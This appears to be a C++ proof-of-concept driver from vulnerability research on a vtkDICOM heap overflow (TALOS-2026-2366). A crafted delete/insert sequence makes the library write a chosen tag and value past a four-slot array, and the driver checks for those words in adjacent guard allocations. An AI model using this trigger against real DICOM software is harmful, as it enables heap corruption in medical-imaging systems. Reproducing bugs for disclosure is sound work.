// Driver for TALOS-2026-2366 / CVE-2026-22879 pinned-function replay.
// Sequence (4-slot store):
//   fill tags 1..4 -> delete tag 3 -> insert 5 (overwrites slot 3) ->
//   delete 5 -> insert 6 (slot 3) -> insert 7 (free slot 2, live count 5) ->
//   insert 8 (vulnerable n=5 -> DataElements[5], one past 4-slot array).
#include "common.h"
#include PINNED

static const uint32_t CHOSEN_TAG = 0x4841434bu; // group 0x4841, element 0x434b
static const uint32_t CHOSEN_VALUE = 0x42424242u;

static void show(vtkDICOMDataElement *g, int n, const char *name)
{
  uint32_t *words = reinterpret_cast<uint32_t *>(g);
  for (int i = 0; i < n * 8; ++i) {
    if (words[i] == CHOSEN_TAG || words[i] == CHOSEN_VALUE) {
      std::printf("CHOSEN %s word[%d]=%08x at %p\n", name, i, words[i],
                  static_cast<void *>(&words[i]));
    }
  }
  std::printf("REGION %s %p..%p\n", name, static_cast<void *>(g),
              static_cast<void *>(g + n));
}

int main(int argc, char **argv)
{
  int mode = (argc > 1 && argv[1][0] == 's') ? 1 : 0; // s = no-delete control
  vtkDICOMItem item;
  for (int i = 1; i <= 4; ++i) {
    item.Set(vtkDICOMTag(0x0008, i), vtkDICOMValue(0x11110000u | unsigned(i)));
  }
  if (item.Count() != 4) { std::printf("FAIL count4=%d\n", item.Count()); return 2; }

  // Same-size allocations after the 4-element store; their Next/Prev fields
  // are initialized so a plain (no-ASan) build can finish the insertion.
  vtkDICOMDataElement *guard1 = new vtkDICOMDataElement[4];
  vtkDICOMDataElement *guard2 = new vtkDICOMDataElement[4];
  for (int g = 0; g < 2; ++g) {
    vtkDICOMDataElement *p = (g == 0 ? guard1 : guard2);
    for (int i = 0; i < 4; ++i) {
      p[i].Next = &p[(i + 1) % 4];
      p[i].Prev = &p[(i + 3) % 4];
    }
  }

  vtkDICOMTag chosen((CHOSEN_TAG >> 16) & 0xffffu, CHOSEN_TAG & 0xffffu);
  if (!mode) {
    item.Set(vtkDICOMTag(0x0008, 3), vtkDICOMValue()); // delete slot 2
    item.Set(vtkDICOMTag(0x0008, 5), vtkDICOMValue(0x05)); // slot 3 overwritten
    item.Set(vtkDICOMTag(0x0008, 5), vtkDICOMValue()); // delete slot 3
    item.Set(vtkDICOMTag(0x0008, 6), vtkDICOMValue(0x06)); // slot 3 again
    item.Set(vtkDICOMTag(0x0008, 7), vtkDICOMValue(0x07)); // free slot 2
  }
  std::printf("STORE %p\n", reinterpret_cast<void *>(item.StoreAddr()));
  std::printf("count_before=%d cap=4\n", item.Count());
  item.Set(chosen, vtkDICOMValue(CHOSEN_VALUE));
  std::printf("count_after=%d\n", item.Count());

  show(guard1, 4, "guard1");
  show(guard2, 4, "guard2");
  delete [] guard2;
  delete [] guard1;
  return 0;
}
